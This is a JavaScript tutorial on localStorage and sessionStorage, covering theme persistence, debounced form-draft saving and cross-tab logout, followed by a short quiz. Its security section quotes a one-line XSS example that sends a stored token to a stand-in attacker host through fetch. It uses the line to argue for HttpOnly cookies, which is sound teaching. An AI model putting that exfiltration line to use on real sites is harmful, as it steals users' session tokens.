# Practical Use Cases for Web Storage in Modern JavaScript

Theoretical knowledge of `localStorage` and `sessionStorage` becomes powerful when applied to real-world frontend challenges. In this tutorial, we implement three production-grade features: dark mode theme persistence, form draft auto-saving, and tab synchronization.

---

## 1. Pattern 1: Dark Mode Theme Persistence (No Flash of Wrong Theme)

A frequent bug in theme switchers is the **Flash of Incorrect Theme (FOIT)**—where a white screen flashes briefly before JavaScript reads `localStorage`.

### The Solution: Synchronous Head Script

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Theme Persistence</title>
  <!-- CRITICAL: Inline script in head runs before body is rendered! -->
  <script>
    (function() {
      const savedTheme = localStorage.getItem('app-theme');
      const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
      const theme = savedTheme || (prefersDark ? 'dark' : 'light');
      document.documentElement.setAttribute('data-theme', theme);
    })();
  </script>
  <link rel="stylesheet" href="styles.css" />
</head>
<body>
  <button id="theme-toggle">Toggle Theme</button>
  <script src="app.js"></script>
</body>
</html>
```

```javascript
// app.js: Interactive toggle logic
const toggleBtn = document.querySelector('#theme-toggle');

toggleBtn.addEventListener('click', () => {
  const currentTheme = document.documentElement.getAttribute('data-theme');
  const nextTheme = currentTheme === 'dark' ? 'light' : 'dark';

  document.documentElement.setAttribute('data-theme', nextTheme);
  localStorage.setItem('app-theme', nextTheme);
});
```

---

## 2. Pattern 2: Form Draft Auto-Saver (Debounced)

Prevent user frustration from accidental page reloads or crashes by auto-saving long textareas into `sessionStorage` or `localStorage`:

```javascript
class DraftAutoSaver {
  constructor(formSelector, storageKey) {
    this.form = document.querySelector(formSelector);
    this.storageKey = storageKey;
    this.debounceTimer = null;

    this.restoreDraft();
    this.attachListeners();
  }

  attachListeners() {
    this.form.addEventListener('input', () => {
      clearTimeout(this.debounceTimer);
      // Debounce: save 500ms after user stops typing
      this.debounceTimer = setTimeout(() => this.saveDraft(), 500);
    });

    this.form.addEventListener('submit', () => {
      // Clear draft once successfully submitted!
      localStorage.removeItem(this.storageKey);
    });
  }

  saveDraft() {
    const formData = new FormData(this.form);
    const data = Object.fromEntries(formData.entries());
    localStorage.setItem(this.storageKey, JSON.stringify(data));
    console.log('Draft auto-saved to localStorage.');
  }

  restoreDraft() {
    const saved = localStorage.getItem(this.storageKey);
    if (!saved) return;

    try {
      const data = JSON.parse(saved);
      Object.entries(data).forEach(([name, value]) => {
        const input = this.form.elements[name];
        if (input) input.value = value;
      });
      console.log('Previous draft restored successfully.');
    } catch (e) {
      console.error('Failed to restore draft:', e);
    }
  }
}

// Instantiate
new DraftAutoSaver('#comment-form', 'draft_comment_post_104');
```

---

## 3. Pattern 3: Cross-Tab Logout Synchronization

When a user logs out in one tab, all other open tabs in the browser should immediately detect the logout and redirect to the login screen for security:

```javascript
// When logout button is clicked in ANY tab:
function performLogout() {
  // Update storage key with timestamp to ensure storage event triggers
  localStorage.setItem('session_logout_event', Date.now().toString());
  localStorage.removeItem('auth_user_token');
  window.location.href = '/login';
}

// In ALL tabs (listening for changes from other tabs):
window.addEventListener('storage', (event) => {
  if (event.key === 'session_logout_event') {
    console.warn('Logout detected in another tab. Redirecting...');
    window.location.href = '/login?reason=remote_logout';
  }
});
```

---

## 4. Security Warning: Why NEVER Store Sensitive JWTs in LocalStorage!

`localStorage` has **no protection against Cross-Site Scripting (XSS)**. Any malicious third-party script injected via an NPM dependency, browser extension, or CDN can read your storage:

```javascript
// Any injected script can steal your tokens in one line:
fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
```

### Production Best Practice:
- **Sensitive Auth Tokens:** Store in `HttpOnly`, `Secure`, `SameSite=Strict` cookies (inaccessible to JavaScript).
- **LocalStorage:** Store only non-sensitive UI state, themes, language preferences, and form drafts.

---

## Practice Quiz

### Q1: How can you prevent "Flash of Incorrect Theme" (FOIT) when persisting a dark theme in localStorage?
- A) Use a Web Worker
- B) Place a small synchronous script inside the HTML <head> to read storage and set the theme before <body> renders
- C) Delay the page load by 2 seconds
- D) Only support light mode
**Answer:** B
**Explanation:** Executing a lightweight script in `<head>` blocks rendering momentarily, ensuring the theme attribute is set on `document.documentElement` before the browser paints the body.

### Q2: Why is debouncing used when auto-saving form inputs to localStorage?
- A) To encrypt the form data
- B) To avoid executing expensive serialization and storage writes on every single keystroke
- C) To ensure inputs are in alphabetical order
- D) To bypass the 5MB storage limit
**Answer:** B
**Explanation:** Debouncing delays execution until the user stops typing for a designated period (e.g. 500ms), preventing hundreds of rapid synchronous storage writes.

### Q3: Why should sensitive authentication tokens (like bank or session JWTs) NOT be stored in localStorage?
- A) Because localStorage is deleted every 2 hours
- B) Because any XSS vulnerability allows malicious scripts to read localStorage and exfiltrate the token
- C) Because localStorage does not support strings longer than 10 characters
- D) Because localStorage requires payment
**Answer:** B
**Explanation:** JavaScript has full access to `localStorage`, meaning any XSS vulnerability can extract stored tokens. `HttpOnly` cookies protect tokens from JavaScript access.

### Q4: When a form is successfully submitted, what should happen to its saved draft in localStorage?
- A) It should be encrypted
- B) It should be removed via localStorage.removeItem()
- C) It should be duplicated
- D) It should be converted to a PDF
**Answer:** B
**Explanation:** Once the data has been successfully committed to the server, removing the draft prevents stale data from re-populating the form later.

### Q5: How can a web application instantly log out a user across 5 open tabs when they click "Logout" in one tab?
- A) By sending a push notification from the operating system
- B) By updating a key in localStorage, triggering the 'storage' event in all other open tabs
- C) By forcing the computer to restart
- D) By opening a popup window
**Answer:** B
**Explanation:** Modifying `localStorage` fires a `storage` event in all other open tabs of the same origin, allowing them to detect the logout and redirect immediately.
